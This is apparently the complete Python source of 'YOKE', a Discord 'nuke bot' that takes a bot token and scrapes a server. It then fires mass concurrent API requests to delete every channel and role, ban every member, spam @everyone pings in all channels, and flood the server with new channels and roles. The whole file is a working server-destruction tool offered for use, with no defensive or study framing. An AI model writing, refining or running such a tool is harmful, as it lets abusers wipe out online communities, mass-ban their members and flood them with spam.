import requests
import asyncio
import aiohttp
import discord
from discord.ext import commands
import colorama
from colorama import Fore
import json
import random
import os


colorama.init(autoreset=True)

version = "[YOKE.v1]"
bot = commands.Bot(command_prefix = ".", intents=discord.Intents().all())

print(f"""

                   @@@@@@@@@@@
              &&@@@@@@@@@@@@&&&&
           &&&@@@@@@@@@@@@@@&&@@@@@&             |  {Fore.MAGENTA}YOKE{Fore.WHITE} nuke bot
         &&@@&&@&@@@@@@@@@@@@&&&&&@@@&&          |    
       %&&&&&&&@&&@{Fore.YELLOW}&%#((((((%{Fore.WHITE}&&&@@@@&&&&&        |  Developed by: {Fore.BLUE}eyerock_#3053{Fore.WHITE}
       %&&@@&@&&{Fore.YELLOW}%((/((%%%%%%((((%{Fore.WHITE}@@@@@@@&&       |  
       %&&@&&&&{Fore.YELLOW}%//(/((((((((##%((({Fore.WHITE}&@@@@@&&@      |  For help join: {Fore.BLUE}discord.gg{Fore.WHITE}
       %&&&&&&&{Fore.YELLOW}//////(((/((((((#@(@{Fore.WHITE}@@@@@@&       |  
        %&&&&&&{Fore.YELLOW}(////////(//((((((({Fore.WHITE}@@&@&&@&       |  Please enter valid bot token to continue...
         %&&&&&%{Fore.YELLOW}/*////////////(/#{Fore.WHITE}&&@&&&&&&       |
          %%&&&&&{Fore.YELLOW}%(****//////#{Fore.WHITE}%&&&&@@@&&         |
            %&&&&&&&&%%%%&&&&&&&&&&&&&
              %%&&&&&&&&&&&&&&&&%&&
                   @@@@@@@@@@@
  
  
""")

TOKEN = input("Bot Token: ")






@bot.event
async def on_ready():
  print("")
  print(f"{Fore.MAGENTA}>{Fore.WHITE} Executer logged in as" + Fore.BLUE + " {0.user}".format(bot))
  print("")
  print(f"{Fore.MAGENTA}>{Fore.WHITE} Type \".scrape\" to scrape server (required)")
  print("")

## SCRAPING FOR GUILD ID ##
@bot.command()
async def scrape(ctx):
  os.system('cls')
  global all_member_id
  all_member_id = []
  mem_count = 0
  for member in ctx.guild.members:
    all_member_id.append(member.id)
    mem_count = mem_count + 1

  

  global guild_id
  global chan_id
  guild_id = ctx.guild.id
  chan_id = ctx.channel.id
  print("")
  print(Fore.MAGENTA + "╔═════╦═════════INFO═══════════╦═════╗")
  print("")
  print(f"{Fore.MAGENTA}>{Fore.WHITE} Scraped {Fore.BLUE}{mem_count}{Fore.WHITE} members...")
  print("")
  print(f"{Fore.MAGENTA}>{Fore.WHITE} guild name:  " + Fore.BLUE + str(ctx.guild))
  #print(f"{Fore.MAGENTA}>{Fore.WHITE} guild id:  " + str(guild_id))
  print("")
  print(f"{Fore.MAGENTA}>{Fore.WHITE} channel name:  " + Fore.BLUE + str(ctx.channel))
  #print(f"{Fore.MAGENTA}>{Fore.WHITE} channel id:  " + str(chan_id))
  print("")
  print(Fore.MAGENTA + "╚══════╩═══════════════════════╩══════╝")
  print("")
  await bot.close() #Closing bot

bot.run(TOKEN)




check1 = input("Press Enter to continue:  ")
os.system('cls')



while True:

  print(f"""{Fore.MAGENTA}                   

  ▄██   ▄      ▄████████  ▄██████▄     ▄█   ▄█▄      ▀█████████▄   ▄██████▄      ███     
 ███   ██▄   ███    ███ ███    ███   ███ ▄███▀        ███    ███ ███    ███ ▀█████████▄ 
 ███▄▄▄███   ███    █▀  ███    ███   ███▐██▀          ███    ███ ███    ███    ▀███▀▀██ 
 ▀▀▀▀▀▀███  ▄███▄▄▄     ███    ███  ▄█████▀          ▄███▄▄▄██▀  ███    ███     ███   ▀ 
 ▄██   ███ ▀▀███▀▀▀     ███    ███ ▀▀█████▄         ▀▀███▀▀▀██▄  ███    ███     ███     
 ███   ███   ███    █▄  ███    ███   ███▐██▄          ███    ██▄ ███    ███     ███     
 ███   ███   ███    ███ ███    ███   ███ ▀███▄        ███    ███ ███    ███     ███     
  ▀█████▀    ██████████  ▀██████▀    ███   ▀█▀      ▄█████████▀   ▀██████▀     ▄████▀   
                                     ▀                                                  
{Fore.WHITE}
╔═════════════════════════════╦═════════════════════════════╦═════════════════════════════╗
║ [{Fore.MAGENTA}1{Fore.WHITE}] Delete all channels     ║ [{Fore.MAGENTA}4{Fore.WHITE}] Ban All                 ║  [{Fore.MAGENTA}7{Fore.WHITE}]                        ║
║ [{Fore.MAGENTA}2{Fore.WHITE}] Mass create channels    ║ [{Fore.MAGENTA}5{Fore.WHITE}] Mass create roles       ║  [{Fore.MAGENTA}8{Fore.WHITE}]                        ║
║ [{Fore.MAGENTA}3{Fore.WHITE}] Mass Ping/Message       ║ [{Fore.MAGENTA}6{Fore.WHITE}] Delete all roles        ║  [{Fore.MAGENTA}9{Fore.WHITE}]                        ║
╚═════════════════════════════╩═════════════════════════════╩═════════════════════════════╝ 
         
    """)

  comm = input("Command: ")
  
  
  ## DELETE ALL CHANNELS ##
  

  async def get_delchan_list(del_chan_session):
    tasks = []
    total = int(len(all_chan_id))
    count = 0
    for x in all_chan_id:

      count = count + 1
      print(f"\r{Fore.MAGENTA}>{Fore.WHITE}  [{Fore.MAGENTA}{count}{Fore.WHITE}/{Fore.MAGENTA}{total}{Fore.WHITE}] Channel Requests Sent", end  = " ")

      url = f"https://discord.com/api/v9/channels/{x}"
      tasks.append(asyncio.create_task(del_chan_session.delete(url = url, headers = header, ssl = False)))
      await asyncio.sleep(0.03)
    return tasks

  async def req_chan_del():
    async with aiohttp.ClientSession() as del_chan_session:
      tasks = await get_delchan_list(del_chan_session)
      await asyncio.gather(*tasks)


  if comm == "1":
    print("")
    all_chan_id = []
    scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    header = {"authorization": "Bot " + TOKEN}   

    # scraping channel ids #
    all_chan_id_req = requests.get(scrape_url, headers = header)
    for channel in json.loads(all_chan_id_req.text):
      all_chan_id.append(channel['id'])
    asyncio.run(req_chan_del())

    
  


  ## SPAM CHANNELS ##
  chan_amount = None

  async def get_chanmake_list(make_chan_session):
    tasks = []
    count = 0
    for x in range(chan_amount):

      count = count + 1
      print(f"\r{Fore.MAGENTA}>{Fore.WHITE}  [{Fore.MAGENTA}{count}{Fore.WHITE}/{Fore.MAGENTA}{chan_amount}{Fore.WHITE}] Channel Requests Sent", end  = " ")

      tasks.append(asyncio.create_task(make_chan_session.post(url = url, headers = header, json = data, ssl = False)))
      await asyncio.sleep(0.03)
    return tasks

  async def req_chan_make():
    async with aiohttp.ClientSession() as make_chan_session:
      tasks = await get_chanmake_list(make_chan_session)
      await asyncio.gather(*tasks)

      
  if comm == "2":
    chan_amount = int(input("Amount of Channels:  "))
    chan_name = input("Name of Channels:  ")
    print("")
    url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    header = {"authorization": "Bot " + TOKEN}
    data = {"type": 0, "name": chan_name, "permission_overwrites": [] }
    asyncio.run(req_chan_make())


  ## SPAM MESSAGE ##

  async def spam_chan_list(spam_session):
    data = {"content": f"@everyone {message}"}
    header = {"authorization": "Bot " + TOKEN}
    tasks = []
    count = 0
    total = len(all_chan_id)

    for x in all_chan_id:

      count = count + 1
      print(f"\r{Fore.MAGENTA}>{Fore.WHITE}  [{Fore.MAGENTA}{count}{Fore.WHITE}/{Fore.MAGENTA}{total}{Fore.WHITE}] Ping Requests Sent [Total Pings Sent [{Fore.MAGENTA}{pings * count}{Fore.WHITE}]]", end  = " ")


      url = f"https://discord.com/api/v9/channels/{x}/messages"
      for x in range(pings):
        tasks.append(asyncio.create_task(spam_session.post(url = url, data = data, headers = header)))
        await asyncio.sleep(0.02)
      await asyncio.sleep(0.02)
      

  async def req_chan_spam():
    async with aiohttp.ClientSession() as spam_session:
      tasks = await spam_chan_list(spam_session)
      await asyncio.gather(*tasks)


      
  if comm == "3":
    message = input("Message:  ")
    pings = int(input("How many messages in each channel (max of 5):  "))
    print("")
    if pings > 5:
      pings = 5
      print(Fore.RED + "[YOKE.v1] ERROR_ --> Pings set to 5")
    header = {"authorization": "Bot " + TOKEN} 
    scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/channels"
    all_chan_id = []
    all_chan_id_req = requests.get(scrape_url, headers = header)
    for channel in json.loads(all_chan_id_req.text):
      all_chan_id.append(channel['id'])
    try:
     asyncio.run(req_chan_spam())
    except:
     print("")
    

    
  ## BAN ALL ##
  async def ban_list(ban_session):
    count = 0
    total = len(all_member_id)
    tasks = []
    header = {"authorization": "Bot " + TOKEN}
    data = {"delete_message_seconds" : 0}
    for x in all_member_id:
      
      count = count + 1
      print(f"\r{Fore.MAGENTA}>{Fore.WHITE}  [{Fore.MAGENTA}{count}{Fore.WHITE}/{Fore.MAGENTA}{total}{Fore.WHITE}] Ban Requests Sent", end  = " ")

      url = f"https://discord.com/api/v9/guilds/{guild_id}/bans/{x}"
      tasks.append(asyncio.create_task(ban_session.put(url = url, headers = header, json = data, ssl = False)))
      await asyncio.sleep(0.03)
    return tasks


  async def req_ban():
    async with aiohttp.ClientSession() as ban_session:
      tasks = await ban_list(ban_session)
      await asyncio.gather(*tasks)
 
  if comm == "4":
    print("")
    asyncio.run(req_ban())

    ## ROLES SPAMMER ##
    
  async def crole_list(crole_session):
    count = 0
    tasks =[]
    header = {"authorization": "Bot " + TOKEN}
    data = {"name": role_name}  
    for x in range(int(amount_roles)):

      count = count + 1
      print(f"\r{Fore.MAGENTA}>{Fore.WHITE}  [{Fore.MAGENTA}{count}{Fore.WHITE}/{Fore.MAGENTA}{int(amount_roles)}{Fore.WHITE}] Role Requests Sent", end  = " ")

      url = f"https://discord.com/api/v9/guilds/{guild_id}/roles"
      tasks.append(asyncio.create_task(crole_session.post(url = url, headers = header, json = data, ssl = False)))
      await asyncio.sleep(0.03)
    return tasks    

  async def req_role_make():
    async with aiohttp.ClientSession() as crole_session:
      tasks = await crole_list(crole_session)
      await asyncio.gather(*tasks)


  if comm == "5":
    url = f"https://discord.com/api/v9/guilds/{guild_id}/roles"
    role_name = input("Name of roles:  ")
    amount_roles = input("Role amount:  ")
    print("")
    asyncio.run(req_role_make())





    ## ROLE DELETER ##
  async def get_delrole_list(del_role_session):
    count = 0
    tasks = []
    header = {"authorization": "Bot " + TOKEN}
    total = len(all_role_id)
    for x in all_role_id:

      count = count + 1
      print(f"\r{Fore.MAGENTA}>{Fore.WHITE}  [{Fore.MAGENTA}{count}{Fore.WHITE}/{Fore.MAGENTA}{total}{Fore.WHITE}] Role Requests Sent", end  = " ")

      url = f"https://discord.com/api/v9/guilds/{guild_id}/roles/{x}"
      tasks.append(asyncio.create_task(del_role_session.delete(url = url, headers = header, ssl = False)))
      await asyncio.sleep(0.03)
    return tasks
  
  async def req_role_del():
    async with aiohttp.ClientSession() as del_role_session:
      tasks = await get_delrole_list(del_role_session)
      await asyncio.gather(*tasks)
  

  if comm == "6":
    print("")
    all_role_id = []
    scrape_url = f"https://discord.com/api/v9/guilds/{guild_id}/roles"
    header = {"authorization": "Bot " + TOKEN}

    all_role_id_req = requests.get(scrape_url, headers = header)
    for role in json.loads(all_role_id_req.text):
      all_role_id.append(role["id"])
    asyncio.run(req_role_del())
  

  print("\n")
  check2 = input("SUCCESS, press enter to continue:  ")

  os.system('cls')